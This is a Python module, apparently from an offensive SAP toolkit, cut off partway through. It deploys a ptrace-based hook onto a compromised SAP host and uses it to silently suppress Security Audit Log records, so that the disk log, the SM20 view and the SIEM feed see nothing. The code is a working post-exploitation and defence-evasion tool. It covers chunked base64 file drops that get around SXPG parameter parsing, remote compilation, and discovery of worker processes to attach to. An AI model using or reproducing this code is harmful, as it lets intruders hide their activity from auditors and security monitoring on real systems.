"""Virtual SAP Death Star — in-memory SAL suppression via ptrace hook.

Deploys and launches Julian Petersohn's ``sap_audit_hook`` C program on a
target SAP host so it attaches (via ``ptrace``) to running ``disp+work``
work-processes and plants INT3 breakpoints on the three SAL sinks
(``fwrite`` to disk, ``write_event_to_DB``, ``EtdSendEvent``).  In
``--suppress`` mode it silently drops audit records matching the operator's
filter across all three paths — the SAL never receives them, SM20 shows
nothing, and the ETD feed / SIEM sees nothing either.

**Not a 0-day.**  SAP confirmed publicly (see the upstream README at
https://github.com/randomstr1ng/virtual-sap-death-star) that this is a
post-exploitation technique.  Running it requires a local shell as
``<sid>adm`` on the SAP host and ``kernel.yama.ptrace_scope <= 1``.  Both
imply the OS-level foothold that any hardened SAP environment should be
preventing at the perimeter.

Integration model:
  * ``deploy_and_launch(node, ...)``  — upload source, compile, launch
    background suppress process, return ``{ok, hook_pid, target_pid, ...}``
  * ``stop(node, ...)``               — SIGTERM the hook (clean detach
    restores the original INT3 bytes)

The Tier 3 wrapper (``sapmap_evasion_tier3.tier3_sal_death_star_launch`` /
``_stop``) sits on top of these and enforces the ``--allow-evasion`` gate.

SXPG note
---------
Every remote command in this module is constructed so it survives SAP's
SXPG parameter parsing: the ``PARAMS`` field is split at whitespace and
outer single-quotes are stripped, so ``sh -c '<script with spaces>'``
gets mangled into ``sh -c`` (empty arg) and the shell fails with
``-c: option requires an argument``.

The escape is the pattern used by ``sap_dpmon_sapstar.chunked_drop_and_run``:
after ``-c``, exactly one whitespace-delimited token — for example
``python3 -c open('x','wb').write(b'ABC')`` (Python code with no spaces).
For anything shell-shaped we can't inline (backgrounding, ``pgrep``, ``if``),
we drop the script to a file via chunked python3 writes, then run it with
``sh /tmp/<file>`` (one space, no quoting).
"""

from __future__ import annotations

import base64
import gzip
import logging
import os
import random
import re
import string
from typing import Optional

logger = logging.getLogger(__name__)

# Vendored source + optional pre-built binary.  When the pre-built
# binary is present in the vendor dir, deploy_and_launch() prefers it
# over the compile-on-target flow — critical for hardened SAP hosts
# where no C compiler is installed (``gcc: command not found``).  Build
# with ``modules/postex/vendor/build_sap_audit_hook.sh``.
_VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "vendor")
HOOK_SOURCE_PATH = os.path.join(_VENDOR_DIR, "sap_audit_hook.c")
HOOK_PREBUILT_PATH = os.path.join(_VENDOR_DIR,
                                    "sap_audit_hook.linux-x86_64")

# Default install layout on the target.  ``<sid>adm`` always has write
# access to ``/tmp`` and can execute from it (SAP hosts don't ship with
# noexec on /tmp by default).  Operator can override via kwargs.
DEFAULT_REMOTE_DIR = "/tmp"
DEFAULT_SOURCE_NAME = "sap_audit_hook.c"
DEFAULT_BINARY_NAME = "sap_audit_hook"
DEFAULT_LOG_NAME = "sap_audit_hook.log"
DEFAULT_PIDFILE_NAME = "sap_audit_hook.pid"

# Chunk size for the python3 base64-write pattern.  Same as dpmon's
# chunked_drop_and_run: fits well under every SAPXPG ``PARAMS`` size cap
# we've encountered (255 chars on older kernels, ~4 KB on 793+).
_UPLOAD_CHUNK = 180


class DeathStarError(RuntimeError):
    """Raised when a Death Star deployment step fails in a way the caller
    should surface to the operator (compile error, no worker PID found,
    permission denied, etc.)."""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _read_source_bytes() -> bytes:
    """Return the raw C source bytes for upload.  Raised as an error if
    the vendored file is missing (e.g. someone ran a partial install)."""
    if not os.path.isfile(HOOK_SOURCE_PATH):
        raise DeathStarError(
            f"Vendored source not found at {HOOK_SOURCE_PATH!r}.  "
            "The postex/vendor/ directory ships with SAPMAP — verify "
            "the install is complete.")
    with open(HOOK_SOURCE_PATH, "rb") as fh:
        return fh.read()


def _gzip_b64(data: bytes) -> str:
    """gzip + base64-encode ``data`` so we can drop the ~60 KB C source
    over an SXPG command channel efficiently.  Gzip cuts the raw source
    (~61 KB) to ~15 KB; base64 grows that back to ~20 KB.  Compared to
    raw-base64 (~82 KB) that's a 4x reduction — matters when every chunk
    costs 1-2 s of SXPG round-trip time."""
    return base64.b64encode(gzip.compress(data, compresslevel=9)).decode(
        "ascii")


def _rand_suffix(n: int = 8) -> str:
    """Random lowercase suffix used to salt tempfile names so parallel
    or retried runs don't collide.  Deterministic through pseudo-random
    generator seed only when the caller supplied one — the default is
    the module-global random state."""
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _run(node, command: str, params: str = "",
          label: str = "", quiet: bool = False) -> dict:
    """Wrapper around ``sapmap_exploit.run_os_command`` that logs the
    command line before firing.  Every death-star OS step goes through
    here so the operator sees exactly what ran on the target.

    ``quiet=True`` suppresses the per-call exec log line — used during
    the chunked upload loop so 100+ chunks don't spam the operator's
    console.  The label line is still emitted, and progress ticks are
    emitted by the caller.
    """
    import sapmap_exploit as _sx
    disp = f"{command} {params}".strip()
    if label:
        print(f"[*] {node.sid}: death_star: {label}")
    if not quiet:
        print(f"[*] {node.sid}: death_star: exec  {disp[:220]}"
               f"{'…' if len(disp) > 220 else ''}")
    return _sx.run_os_command(node, command, params)


# ---------------------------------------------------------------------------
# SXPG-safe primitives — no shell quoting anywhere
# ---------------------------------------------------------------------------
#
# Rule of thumb for every call in this module:
#
#   * The ``command`` field is a single executable path (no spaces).
#   * The ``params`` field is either empty, or one or more space-
#     delimited tokens.  NO wrapping single-quotes, NO embedded
#     double-quotes.  Anything that would need shell metacharacters
#     goes into a file via ``_write_remote_file`` and then runs via
#     ``sh <path>`` — a two-token argv that SXPG can't mangle.
#
# ---------------------------------------------------------------------------

def _fmt_duration(seconds: float) -> str:
    """Format a duration for the upload-progress line.  ``5.2`` →
    ``5s``, ``72`` → ``1m12s``, ``3720`` → ``1h02m``.  Kept short so
    the progress line stays scannable."""
    s = int(round(max(0.0, seconds)))
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m{s % 60:02d}s"
    return f"{s // 3600}h{(s % 3600) // 60:02d}m"


def _verify_scratch_size(node, scratch_path: str, expected: int,
                           chunks_done: int, n_chunks: int) -> None:
    """Run ``wc -c`` on the target-side scratch b64 file and raise if
    its size doesn't match the number of bytes we've streamed so far.
    Called mid-upload every _VERIFY_INTERVAL chunks so a truncated
    chunk surfaces within seconds instead of at end-of-loop.

    We swallow non-success wc results (network hiccup) because the
    final wc -c at the end of ``_write_remote_file`` catches anything
    the mid-flight check missed."""
    r = _run(node, "wc", f"-c {scratch_path}",
              label=f"verify chunks 1..{chunks_done}", quiet=True)
    if not r.get("success"):
        return
    out = " ".join(r.get("output") or []).strip()
    try:
        got = int(out.split()[0])
    except (ValueError, IndexError):
        return
    if got != expected:
        raise DeathStarError(
            f"scratch b64 size mismatch at chunk {chunks_done}/"
            f"{n_chunks}: expected {expected} B, got {got} B.  A "
            f"chunk between #{max(1, chunks_done - 49)} and "
            f"#{chunks_done} was truncated in transit (SXPG PARAMS "
            f"field cap likely exceeded on this kernel build).")


def _write_remote_file(node, remote_path: str, data: bytes,
                        label: str = "") -> None:
    """Drop ``data`` at ``remote_path`` on the target via chunked
    python3 base64 writes.

    Uses the dpmon-proven pattern: write the base64 CHUNKS LITERALLY
    to a scratch ``.b64`` file (short PARAMS payload — comfortably
    under every kernel's 255-char PARAMS cap), then run one final
    python3 call to decode the scratch file → ``remote_path``.

    Earlier iteration tried to decode in-flight
    (``__import__('base64').b64decode(b'CHUNK')`` inside every chunk
    write).  That wrapper adds ~55 chars of Python boilerplate; with a
    180-char b64 chunk plus a ~40-char path plus ``-c`` framing the
    PARAMS field hit ~275 chars — right at the SXPG truncation
    boundary on some kernel builds.  Truncated chunks got silently
    dropped, and the final file was missing early bytes; the shell
    then hit ``fi`` on line 2 with no matching ``if`` and errored out
    with ``syntax error near unexpected token 'fi'``.

    Post-upload verification: ``wc -c`` on both the scratch b64 file
    (expected length known client-side) and the decoded final file
    (expected == len(data)).  Any mismatch raises ``DeathStarError``
    immediately so the operator sees the corruption cause instead of
    a confused-shell error 30 s later.

    Raises ``DeathStarError`` on any chunk failure or size mismatch.
    """
    payload = base64.b64encode(data).decode("ascii")
    scratch_path = remote_path + ".b64"
    n_chunks = (len(payload) + _UPLOAD_CHUNK - 1) // _UPLOAD_CHUNK
    if label:
        print(f"[*] {node.sid}: death_star: {label} "
              f"({len(data)} B raw, {len(payload)} B b64, "
              f"{n_chunks} chunk(s) of {_UPLOAD_CHUNK} B)")

    # Wipe both prior scratch and prior final so a rerun starts clean.
    # Two-token ``rm -f <a> <b>`` argv, SXPG-safe.
    _run(node, "/bin/rm", f"-f {scratch_path} {remote_path}",
          label=f"clear prior {remote_path}(.b64)?")

    import time as _time
    upload_start = _time.time()
    # Interim ``wc -c`` verify every _VERIFY_INTERVAL chunks catches a
    # silently-truncated chunk within seconds — instead of after ~7 min
    # of upload followed by an end-of-loop size mismatch that leaves
    # the operator wondering which chunk actually failed.  50 chunks
    # over ~700 total → ~14 extra RTTs, ~10 s added to the total upload.
    _VERIFY_INTERVAL = 50

    for i in range(n_chunks):
        chunk_b64 = payload[i * _UPLOAD_CHUNK:(i + 1) * _UPLOAD_CHUNK]
        mode = "wb" if i == 0 else "ab"
        # dpmon pattern: python3 -c open('/tmp/x.b64','ab').write(b'B64CHUNK')
        # ~40 (path) + ~40 (call wrapper) + 180 (chunk) = ~260 chars,
        # inside the SXPG PARAMS budget on every kernel we've tested.
        # No in-flight decode → any transit mangling produces a broken
        # b64 file that fails the decode step below (visibly), not a
        # silently-truncated final file that hits the shell parser.
        code = f"open('{scratch_path}','{mode}').write(b'{chunk_b64}')"
        r = _run(node, "python3", f"-c {code}", quiet=True)
        if not r.get("success"):
            raise DeathStarError(
                f"chunk write failed at {i + 1}/{n_chunks}: "
                f"{r.get('error') or 'unknown'}")
        chunks_done = i + 1

        # Progress every ~10 chunks (or last) — includes elapsed + ETA
        # so the operator has a rough sense of when the upload finishes
        # instead of watching a bare percent creep.
        if chunks_done % 10 == 0 or chunks_done == n_chunks:
            elapsed = _time.time() - upload_start
            rate = chunks_done / elapsed if elapsed > 0 else 0
            eta_s = ((n_chunks - chunks_done) / rate) if rate > 0 else 0
            pct = int(100 * chunks_done / n_chunks)
            print(f"[*] {node.sid}: death_star:   chunk "
                  f"{chunks_done}/{n_chunks} ({pct}%) — "
                  f"elapsed {_fmt_duration(elapsed)}, "
                  f"ETA {_fmt_duration(eta_s)} "
                  f"@ {rate * _UPLOAD_CHUNK / 1024:.1f} KB/s")

        # Interim size verification.  If a chunk was truncated in
        # transit (SXPG PARAMS overrun on this kernel build), the
        # scratch file size will diverge from expected within 50
        # chunks and we fail with a precise range.
        if (chunks_done % _VERIFY_INTERVAL == 0
                and chunks_done != n_chunks):
            expected = min(chunks_done * _UPLOAD_CHUNK, len(payload))
            _verify_scratch_size(node, scratch_path, expected,
                                    chunks_done, n_chunks)

    # Verify the scratch b64 has the expected byte count — catches any
    # silent truncation of a chunk write before we spend time on the
    # decode step.  ``wc -c`` output: ``<size> <path>``.
    check_b64 = _run(node, "wc", f"-c {scratch_path}",
                      label="verify b64 scratch")
    if check_b64.get("success"):
        out = " ".join(check_b64.get("output") or []).strip()
        try:
            got = int(out.split()[0])
        except (ValueError, IndexError):
            got = None
        if got is not None and got != len(payload):
            raise DeathStarError(
                f"scratch b64 size mismatch: expected {len(payload)} B, "
                f"got {got} B — chunk(s) were truncated in transit "
                f"(check the target's SXPG PARAMS field cap)")

    # One-shot decode: b64 scratch → decoded final file.
    # After ``-c`` this is one whitespace-free token — same SXPG-safe
    # discipline as the chunk writes.
    code = (f"open('{remote_path}','wb').write("
             f"__import__('base64').b64decode("
             f"open('{scratch_path}','rb').read()))")
    r = _run(node, "python3", f"-c {code}",
              label=f"decode → {remote_path}")
    if not r.get("success"):
        raise DeathStarError(
            f"b64 decode failed: {r.get('error') or 'unknown'} "
            f"— scratch at {scratch_path} kept for inspection")

    # Verify decoded final file size matches the raw payload length.
    check_final = _run(node, "wc", f"-c {remote_path}",
                        label="verify decoded final")
    if check_final.get("success"):
        out = " ".join(check_final.get("output") or []).strip()
        try:
            got = int(out.split()[0])
        except (ValueError, IndexError):
            got = None
        if got is not None and got != len(data):
            raise DeathStarError(
                f"decoded size mismatch: expected {len(data)} B, "
                f"got {got} B — the b64 payload was somehow corrupted "
                f"between chunk write and decode (scratch: "
                f"{scratch_path})")

    # Cleanup scratch b64 — non-fatal.
    _run(node, "/bin/rm", f"-f {scratch_path}",
          label="cleanup scratch b64")


# ---------------------------------------------------------------------------
# Upload
# ---------------------------------------------------------------------------

def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
                    source_name: str = DEFAULT_SOURCE_NAME) -> str:
    """Upload the C source to ``<remote_dir>/<source_name>``.

    Two-step:
      1. ``_write_remote_file`` drops the gzip-compressed source bytes
         at ``<remote_path>.gz`` (chunked b64 + verify).
      2. One python3 call to gunzip that into the final ``.c`` path.
      3. Verify decompressed size matches the raw source.
      4. Clean up the ``.gz`` scratch.

    Returns the absolute remote path.
    """
    src = _read_source_bytes()
    remote_path = f"{remote_dir.rstrip('/')}/{source_name}"
    gz_path = f"{remote_path}.gz"

    # Step 1: upload the gzip bytes.  ``_write_remote_file`` handles
    # chunk + verify + b64-decode internally so this is a single call.
    gz_bytes = gzip.compress(src, compresslevel=9)
    _write_remote_file(node, gz_path, gz_bytes,
                        label=f"upload gzipped source → {gz_path}")

    # Step 2: decompress → final .c file.  One whitespace-free token
    # after ``-c`` — SXPG-safe.
    code = (
        f"open('{remote_path}','wb').write("
        f"__import__('gzip').decompress("
        f"open('{gz_path}','rb').read()))"
    )
    r = _run(node, "python3", f"-c {code}",
              label=f"decompress → {remote_path}")
    if not r.get("success"):
        raise DeathStarError(
            f"decompress failed: {r.get('error') or 'unknown'}")

    # Step 3: verify decompressed size.
    check = _run(node, "wc", f"-c {remote_path}",
                  label="verify decompressed source")
    if check.get("success"):
        out = " ".join(check.get("output") or []).strip()
        got_size = None
        try:
            got_size = int(out.split()[0])
        except (ValueError, IndexError):
            pass
        if got_size is not None and got_size != len(src):
            raise DeathStarError(
                f"decompressed size mismatch: expected {len(src)} B, "
                f"got {got_size} B ({gz_path} corrupted mid-transit)")
        print(f"[+] {node.sid}: death_star: uploaded — {out}")

    # Step 4: cleanup scratch .gz — non-fatal.
    _run(node, "/bin/rm", f"-f {gz_path}",
          label="cleanup scratch gz")

    return remote_path


# ---------------------------------------------------------------------------
# Compile
# ---------------------------------------------------------------------------

def compile_hook(node, source_path: str,
                  binary_path: Optional[str] = None,
                  remote_dir: str = DEFAULT_REMOTE_DIR) -> str:
    """Compile the uploaded source with gcc.  Returns the absolute path
    to the produced binary.  Raises ``DeathStarError`` on any gcc
    failure — the compilation output is included in the message so the
    operator can see missing headers, etc.

    We can't run gcc directly with SXPG and see its stderr — SXPG's
    ``success`` flag reflects only its own protocol, not gcc's exit
    code, so a silent gcc failure previously came back as
    ``success=True`` with no binary produced.  Instead, drop a small
    compile-wrapper script that:

      * Wipes any prior binary so a re-compile isn't fooled by a
        stale artefact.
      * Runs gcc with stderr redirected to a log file.
      * Prints tagged ``STATUS:`` lines the caller can parse verbatim
        (gcc exit code, binary presence + size).
      * Dumps the compile log so the operator sees the actual error.

    Then invoke ``sh /tmp/<compile>.sh`` — two-token SXPG-safe argv.
    """
    if binary_path is None:
        binary_path = source_path[:-2] if source_path.endswith(".c") else (
            source_path + ".bin")

    # -Wno-format-truncation matches Julian's upstream README verbatim.
    # If the target's gcc is older than 7 and rejects it, the compile
    # log will surface that clearly instead of a mysterious silent
    # failure.
    #
    # Compiler discovery: SAP application servers often ship without a
    # compiler installed (production hardening).  Try common names +
    # install paths in order — first hit wins.  If nothing is found we
    # emit ``STATUS: no_compiler`` and the operator gets a clear
    # remediation message (install a compiler, or drop a pre-built
    # binary alongside the source).
    compile_log = f"{remote_dir.rstrip('/')}/sap_audit_hook.compile.log"
    scratch_sh = (f"{remote_dir.rstrip('/')}/"
                    f"sapmap_ds_compile_{_rand_suffix()}.sh")
    script = (
        f"#!/bin/sh\n"
        f"rm -f {binary_path} {compile_log}\n"
        # Search PATH for a compiler.  POSIX ``command -v`` returns
        # the resolved path if found, empty otherwise.  Fall back to
        # explicit install paths for hosts where PATH doesn't include
        # the compiler's directory (SAP <sid>adm profile scripts often
        # strip PATH down to /usr/sap-only bins).
        f"CC=\n"
        f"for candidate in gcc cc clang "
        f"/usr/bin/gcc /usr/bin/cc /usr/bin/clang "
        f"/usr/local/bin/gcc /opt/gcc/bin/gcc; do\n"
        f"  if [ -x \"$candidate\" ] 2>/dev/null; then\n"
        f"    CC=\"$candidate\"; break\n"
        f"  fi\n"
        f"  if command -v \"$candidate\" >/dev/null 2>&1; then\n"
        f"    CC=`command -v \"$candidate\"`; break\n"
        f"  fi\n"
        f"done\n"
        f"if [ -z \"$CC\" ]; then\n"
        f"  echo STATUS: no_compiler\n"
        f"  exit 0\n"
        f"fi\n"
        f"echo STATUS: compiler=$CC\n"
        f"$CC -O2 -Wall -Wno-format-truncation "
        f"-o {binary_path} {source_path} > {compile_log} 2>&1\n"
        f"RC=$?\n"
        f"echo STATUS: cc_exit=$RC\n"
        f"if [ -x {binary_path} ]; then\n"
        # Size via wc -c (POSIX); portable across Linux + BSD.
        f"  SZ=`wc -c < {binary_path} 2>/dev/null`\n"
        f"  echo STATUS: binary_present size=$SZ path={binary_path}\n"
        f"else\n"
        f"  echo STATUS: binary_missing path={binary_path}\n"
        f"fi\n"
        # Dump the compile log so the operator sees the actual error
        # lines when something went wrong.  Cap at 40 lines to keep
        # the SXPG output field within its cap on old kernels.
        f"if [ -s {compile_log} ]; then\n"
        f"  echo GCC_LOG_BEGIN:\n"
        f"  head -40 {compile_log}\n"
        f"  echo GCC_LOG_END:\n"
        f"fi\n"
    )

    _write_remote_file(node, scratch_sh, script.encode("utf-8"),
                        label=f"drop compile wrapper → {scratch_sh}")

    r = _run(node, "sh", scratch_sh,
              label=f"compile → {binary_path}")
    _run(node, "/bin/rm", f"-f {scratch_sh}",
          label="cleanup compile wrapper")

    lines = r.get("output") or []
    if not r.get("success"):
        raise DeathStarError(
            f"compile wrapper failed to run: "
            f"{r.get('error') or 'unknown'}")

    # Parse STATUS lines and gcc log lines.
    compiler_path = None
    no_compiler = False
    cc_exit = None
    binary_present = False
    binary_size = None
    gcc_log = []
    in_log = False
    for ln in lines:
        s = ln.strip()
        if s.startswith("STATUS:"):
            body = s[len("STATUS:"):].strip()
            if body == "no_compiler":
                no_compiler = True
            elif body.startswith("compiler="):
                compiler_path = body.split("=", 1)[1].strip()
            elif body.startswith("cc_exit="):
                try:
                    cc_exit = int(body.split("=", 1)[1])
                except (ValueError, IndexError):
                    pass
            elif body.startswith("binary_present"):
                binary_present = True
                # Parse size=NNN
                for tok in body.split():
                    if tok.startswith("size="):
                        try:
                            binary_size = int(tok.split("=", 1)[1])
                        except (ValueError, IndexError):
                            pass
            elif body.startswith("binary_missing"):
                binary_present = False
        elif s == "GCC_LOG_BEGIN:":
            in_log = True
        elif s == "GCC_LOG_END:":
            in_log = False
        elif in_log:
            gcc_log.append(s)

    # No compiler on target — SAP application servers are often hardened
    # this way.  Clear operator guidance in the error so they can
    # install one or ship a pre-built binary.
    if no_compiler:
        raise DeathStarError(
            "no C compiler found on the target — checked gcc, cc, "
            "clang in PATH plus common install paths "
            "(/usr/bin, /usr/local/bin, /opt/gcc/bin).  SAP "
            "application servers are often hardened without a "
            "compiler installed.  Options: (a) install gcc/cc as "
            "root on the target — e.g. ``zypper install gcc`` on "
            "SUSE, ``apt install build-essential`` on Debian/Ubuntu, "
            "``yum install gcc`` on RHEL; (b) build the binary on a "
            "matching Linux host (see modules/postex/vendor/README.md) "
            "and drop it at " + binary_path + " manually via any "
            "OS-exec channel, then re-arm with skip_upload=True + "
            "skip_compile=True.")

    if compiler_path:
        print(f"[*] {node.sid}: death_star: using {compiler_path}")

    if gcc_log:
        # Surface every gcc line so the operator sees the actual error
        # (missing headers, invalid flag on old gcc, etc.).
        for line in gcc_log:
            print(f"[*] {node.sid}: death_star:   cc: {line}")

    if not binary_present:
        # No binary + compile log → clearest possible operator error.
        log_summary = (" | ".join(gcc_log[-5:]) if gcc_log
                        else "(no compile output captured)")
        raise DeathStarError(
            f"{compiler_path or 'cc'} did not produce {binary_path!r} "
            f"(exit code = {cc_exit}).  Last compile log lines: "
            f"{log_summary}.  Full log on target: {compile_log}")

    if cc_exit not in (None, 0):
        # Weird case: binary exists but compiler reported non-zero.
        print(f"[!] {node.sid}: death_star: compiler exited non-zero "
               f"({cc_exit}) but binary was produced — continuing")

    print(f"[+] {node.sid}: death_star: compiled — "
           f"{binary_path} ({binary_size} B)")
    return binary_path


# ---------------------------------------------------------------------------
# Pre-built binary upload (no compile required on target)
# ---------------------------------------------------------------------------

def has_prebuilt_binary() -> bool:
    """True when ``modules/postex/vendor/sap_audit_hook.linux-x86_64``
    exists and is non-empty.  Callers use this to decide whether to
    take the fast/simple path (upload binary → chmod → launch) vs. the
    compile-on-target path (upload source → gcc → launch).
    """
    try:
        return (os.path.isfile(HOOK_PREBUILT_PATH)
                and os.path.getsize(HOOK_PREBUILT_PATH) > 0)
    except OSError:
        return False


def upload_prebuilt_binary(node,
                             binary_path: Optional[str] = None,
                             remote_dir: str = DEFAULT_REMOTE_DIR) -> str:
    """Upload the vendored pre-built ``sap_audit_hook`` binary to the
    target, chmod +x it, and verify it can execute.

    Skips compilation entirely — the caller doesn't need a compiler
    on the target.  This is the deployment path for hardened SAP
    application servers (SUSE Linux Enterprise Server for SAP
    Applications, RHEL for SAP, etc.) where ``gcc`` isn't installed
    and root install is not an option.

    Returns the absolute remote path to the executable binary.  Raises
    ``DeathStarError`` when the vendored binary is missing or the
    chmod/verify step fails.
    """
    if not has_prebuilt_binary():
        raise DeathStarError(
            f"pre-built binary not found at {HOOK_PREBUILT_PATH!r}.  "
            "Build it locally: "
            "``cd modules/postex/vendor/ && ./build_sap_audit_hook.sh``")
    if binary_path is None:
        binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"

    with open(HOOK_PREBUILT_PATH, "rb") as fh:
        binary_bytes = fh.read()

    _write_remote_file(node, binary_path, binary_bytes,
                        label=(f"upload pre-built binary "
                                f"({len(binary_bytes)} B) → {binary_path}"))

    # chmod +x — SXPG-safe two-token argv.
    r = _run(node, "chmod", f"+x {binary_path}",
              label=f"chmod +x {binary_path}")
    if not r.get("success"):
        raise DeathStarError(
            f"chmod +x failed: {r.get('error') or 'unknown'}")

    # Sanity — run `--help` and check the output contains strings unique
    # to Julian's usage() function: "--suppress" and "--filter CLASS".
    # Previous loose check ("sap_audit_hook" in output) false-positived
    # on error messages containing the binary path, e.g.
    # "nohup: failed to run command '/tmp/sap_audit_hook': No such file".
    check = _run(node, binary_path, "--help",
                  label=f"verify binary — {binary_path} --help")
    got = " ".join(check.get("output") or [])
    if "--suppress" not in got or "--filter" not in got:
        raise DeathStarError(
            f"pre-built binary at {binary_path} does not produce "
            f"expected --help output (need '--suppress' and '--filter' "
            f"in usage text) — corrupted upload or "
            f"incompatible target ABI (need Linux x86_64).  Got: "
            f"{got[:300]!r}")
    print(f"[+] {node.sid}: death_star: pre-built binary deployed — "
           f"{binary_path} ({len(binary_bytes)} B, "
           f"no compile needed on target)")
    return binary_path


# ---------------------------------------------------------------------------
# Worker-PID discovery
# ---------------------------------------------------------------------------

# comm name pattern for an audit-writing work process.  Matches both the
# old ``disp+work`` name (kernel ≤ 749) and the new ``dw.sap<SID>_<inst>``
# name (kernel ≥ 750).  The trailing ``_W<n>`` marks a dialog/work slot.
_WORKER_COMM_RE = re.compile(
    r"^(?P<pid>\d+)\s+(?P<comm>\S+)\s+(?P<args>.+)$"
)


def _classify_worker(comm: str) -> Optional[str]:
    """Classify a work-process ``comm`` string.

    Returns ``"worker"`` for dialog workers (``_W\\d+`` suffix,
    handle the widest range of audit-worthy actions), ``"fallback"``
    for non-dialog work-processes we can still hook (``_BTC`` batch,
    ``_SPO`` spool, ``_UP2`` update-2), or ``None`` for anything we
    should skip (dispatcher ``_DP``, non-SAP processes).

    Two SAP kernel eras:
      * Kernel ≤ 749 exposes ``comm = disp+work`` (all processes share
        the same comm; type detection via /proc/PID/exe args).
      * Kernel ≥ 750 exposes ``comm = SAP_<SID>_<inst>_<type>``, e.g.
        ``SAP_S4H_00_W0`` for the dialog worker slot 0 on S4H
        instance 00.  The trailing ``_DP`` / ``_W<n>`` / ``_BTC`` /
        ``_SPO`` / ``_UP2`` is the reliable type marker.

    Operator report: S/4 793 target's comm was ``SAP_S4H_00_W0`` etc.
    Previous version required either ``disp+work`` in comm OR
    ``dw.sap`` prefix — neither applied to the modern comm format —
    so the workers were skipped despite being valid targets.  This
    classifier makes the ``_W\\d+`` suffix authoritative regardless
    of the leading token.
    """
    # Dispatcher — never emits audit records.
    if comm.endswith("_DP"):
        return None
    # Kernel-750+ dialog worker: ``..._W<n>`` (SAP_S4H_00_W0).
    if re.search(r"_W\d+$", comm):
        return "worker"
    # Kernel-750+ non-dialog work-processes we can still hook.
    for suffix in ("_BTC", "_SPO", "_UP2", "_UPD"):
        if comm.endswith(suffix):
            return "fallback"
    # Kernel-≤749: single ``disp+work`` comm shared by every process.
    # Treat as a generic worker candidate (the C hook does its own
    # per-process type discrimination via /proc/PID/exe).
    if comm == "disp+work" or comm.startswith("dw.sap"):
        return "fallback"
    return None


def find_worker_pid(node,
                      remote_dir: str = DEFAULT_REMOTE_DIR
                      ) -> tuple[int, str]:
    """Find a disp+work work-process PID (not the dispatcher) suitable
    for hooking.  Returns ``(pid, comm)``.

    Two-phase discovery:
      1. ``ps -eo pid,comm,args``.  Simple + fast.  Modern
         (kernel ≥ 750) comm format ``SAP_<SID>_<inst>_<type>`` is
         recognised via the ``_W\\d+`` suffix classifier (see
         ``_classify_worker``).
      2. Fallback: dropped shell script that walks ``/proc/[0-9]*/comm``
         directly.  Fires when ``ps`` produces zero matches — bulletproof
         against ps-output-format quirks (different distros ship
         different procps flags, some SXPG shells constrain PATH so
         ``ps`` resolves to a non-procps variant, etc.).  Same
         classifier; different data source.

    Prefers a ``_W\\d+`` worker (dialog) since dialog work-processes
    handle the widest range of audit-worthy actions.  Falls back to
    ``_BTC`` / ``_SPO`` / ``_UP2`` / plain ``disp+work``.  Refuses
    ``_DP`` (dispatcher — never emits audit records).
    """
    workers: list[tuple[int, str]] = []
    fallbacks: list[tuple[int, str]] = []

    # ---- Phase 1: ps -eo pid,comm,args ----
    r = _run(node, "ps", "-eo pid,comm,args --no-headers",
              label="enumerate SAP processes (ps)")
    ps_lines = r.get("output") or [] if r.get("success") else []
    for line in ps_lines:
        m = _WORKER_COMM_RE.match(line.strip())
        if not m:
            continue
        comm = m.group("comm")
        pid = int(m.group("pid"))
        klass = _classify_worker(comm)
        if klass == "worker":
            workers.append((pid, comm))
        elif klass == "fallback":
            fallbacks.append((pid, comm))

    # ---- Phase 2: /proc walk fallback ----
    # Fires only when Phase 1 produced nothing.  Operator reported ps
    # returning workers-visible-to-the-shell but SAPMAP parsing 0 —
    # some SXPG shells constrain PATH to /usr/sap-only bins where the
    # available ``ps`` doesn't accept ``--no-headers`` or returns a
    # non-standard column layout.  Walk /proc directly and read the
    # comm file — bypasses ps entirely.
    if not workers and not fallbacks:
        print(f"[*] {node.sid}: death_star: ps returned no work-processes "
               f"({len(ps_lines)} line(s) parsed) — falling back to "
               f"/proc walk")
        # Log first few ps lines verbatim so the operator can see what
        # format SAPXPG actually returned.  Helps diagnose if the
        # regex or the classifier is missing something.
        for i, ln in enumerate(ps_lines[:8]):
            print(f"[*] {node.sid}: death_star:   ps[{i}]: "
                   f"{ln.rstrip()[:120]}")

        proc_workers, proc_fallbacks = _find_workers_via_proc(
            node, remote_dir=remote_dir)
        workers.extend(proc_workers)
        fallbacks.extend(proc_fallbacks)

    if workers:
        pid, comm = workers[0]
        print(f"[+] {node.sid}: death_star: worker PID {pid} ({comm})")
        return pid, comm
    if fallbacks:
        pid, comm = fallbacks[0]
        print(f"[+] {node.sid}: death_star: fallback PID {pid} ({comm}) "
              f"— no dialog worker found")
        return pid, comm
    raise DeathStarError(
        "no disp+work / dw.sap work-processes found (both ps and "
        "/proc walk came back empty).  Verify SAP is running on this "
        "host with ``ps -eo pid,comm | grep -E '_W[0-9]+|disp\\+work'`` "
        "as <sid>adm.")


def _discover_audit_file(node, sid: str,
                            remote_dir: str = DEFAULT_REMOTE_DIR
                            ) -> Optional[str]:
    """Discover the newest SAP Security Audit Log ``.AUD`` file on the
    target.

    SAP writes SAL to ``<DIR_AUDIT>/<FN_AUDIT>``.  Julian's C hook tries
    to recover DIR_AUDIT from ``disp+work``'s symbol ``NM_H_RSAU_FILE``
    at attach time, but that symbol is Build-A-only (per the hook's own
    comment at line 60) and is missing on kernel 793 SUSE builds — the
    hook then emits ``[warn] could not find audit log file; use
    --audit-file``.  We probe for it explicitly here so the hook can
    inotify-poison the file too, not just the DB writes.

    Strategy: iterate ``/usr/sap/<SID>/<INST>/log/*.AUD`` for every
    instance of this SID, ordered by mtime, return the newest.  On DB-
    recording-only targets there are no ``.AUD`` files at all — we
    return ``None`` and the hook runs without ``--audit-file`` (the
    warning becomes moot because there's no file sink to poison).

    Returns the absolute path (e.g. ``/usr/sap/S4H/D00/log/20260708000000.AUD``)
    or ``None`` if no file was found or the probe failed.
    """
    scratch_sh = (f"{remote_dir.rstrip('/')}/"
                    f"sapmap_ds_audfind_{_rand_suffix()}.sh")
    # POSIX sh — ``find`` -printf ``%T@ %p`` gives us epoch mtime +
    # path; sort -rn puts the newest first; head -1 picks it.  The
    # awk strips the timestamp column back off so we only get the
    # path.  All widely available (busybox find lacks ``-printf`` on
